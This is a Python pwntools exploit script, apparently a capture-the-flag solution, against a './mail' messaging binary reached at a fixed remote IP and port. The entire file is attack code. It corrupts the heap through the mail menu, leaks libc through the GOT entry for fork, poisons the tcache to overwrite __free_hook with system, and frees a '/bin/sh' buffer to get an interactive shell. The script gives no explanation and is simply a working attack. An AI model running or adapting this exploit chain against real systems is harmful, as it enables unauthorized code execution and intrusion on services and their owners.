#!/usr/bin/python
from pwn import *
import sys

config = {
    "elf" : "./mail",
    "libc" : "/usr/lib/x86_64-linux-gnu/libc-2.31.so",
    "HOST" : "34.146.156.91",
    "PORT" : 10004
}

def create(_id):
    r.sendlineafter("off\n", "0")
    r.sendlineafter("id =\n", _id)

def login(_id):
    r.sendlineafter("off\n", "1")
    r.sendlineafter("=\n", _id)

def send(msg, recp):
    r.sendlineafter("off\n", "2")
    r.sendlineafter("=\n", msg)
    r.sendlineafter("=\n", recp)

def inbox(idx):
    r.sendlineafter("off\n", "3")
    r.sendlineafter("=\n", str(idx))

def delet(idx):
    r.sendlineafter("off\n", "4")
    r.sendlineafter("=\n", str(idx))

def logout():
    r.sendlineafter("off\n", "5")

def exploit(r):
    payload = '\x00'*0x28+p64(0x31)
    payload+= p64(0xdeadbeef)
    payload+= p64(e.got["fork"])+p64(8)
    payload+= p64(0x405645) # db 'Deleted',0

    # Setup
    create("Deleted")
    create("BBBB")
    login("Deleted")
    send(payload, "Deleted")
    sleep(0.1)
    send("VICTIM", "BBBB")
    sleep(0.1)
    login("BBBB\x00")
    delet(0)
    login("Deleted")
    inbox(0)
    delet(0)
    create("CCCC")

    # Stuffs
    r.sendlineafter("off\n", "2")
    r.sendlineafter("=\n", "SMOL")
    r.sendlineafter("=\n", "Deleted")

    r.sendline("2")
    r.sendline("Z"*(0x400+len(payload)+8))
    sleep(1)
    r.sendline("AAAAAAAAAAAAAAAA")
    r.recvuntil("Error")

    # Libc leak
    inbox(0)
    r.recvline()
    r.recvline()
    libc_base = u64(r.recvline().rstrip().ljust(8, '\x00'))
    libc_base-= libc.symbols["fork"]
    print("libc_base: {:#x}".format(libc_base))

    # Clear tcache
    sleep(0.3)
    send("PLS", "BBBB\x00")
    sleep(0.1)
    send("PLS", "BBBB\x00")
    sleep(0.1)

    payload = 'Y'*0x60
    payload+= p64(libc_base+libc.symbols["__free_hook"])

    create("Error...")
    create("bbbb\x00")
    login("Error...")
    send("cmon", "bbbb\x00")
    sleep(0.1)
    send("cmon", "bbbb\x00")
    sleep(0.1)
    send(payload, "bbbb\x00")
    sleep(0.1)
    send("/bin/sh\x00", "bbbb\x00")
    sleep(0.1)

    login("bbbb\x00")
    inbox(2)
    delet(2)
    delet(1)
    delet(0)
    create("0000")
    create("1111")
    create("2222")
    create("3333")

    sleep(1)
    r.sendlineafter("off\n", "2")
    r.sendlineafter("=\n", "TINY")
    r.sendlineafter("=\n", "Error...\x00")

    r.sendline("2")
    r.sendline("X"*(0x400+len(payload)+0x10))
    sleep(2)
    r.sendline("AWOWOW")
    r.recvuntil("Error")

    login("bbbb\x00")
    win = libc_base + libc.symbols["system"]
    send(p64(win), "bbbb\x00")
    send(p64(win), "bbbb\x00")
    delet(0)

    r.interactive()
    return

if __name__ == "__main__":
    if "elf" in config.keys() and config["elf"]:
        e = ELF(config["elf"])
    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if "remote" in sys.argv:
        r = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir():
            r = process(config["elf"], env={"LD_PRELOAD" : "./noalarm.so"})
        else:
            r = process(config["elf"])

        print util.proc.pidof(r)
        if "debug" in sys.argv:
            pause()

    exploit(r)
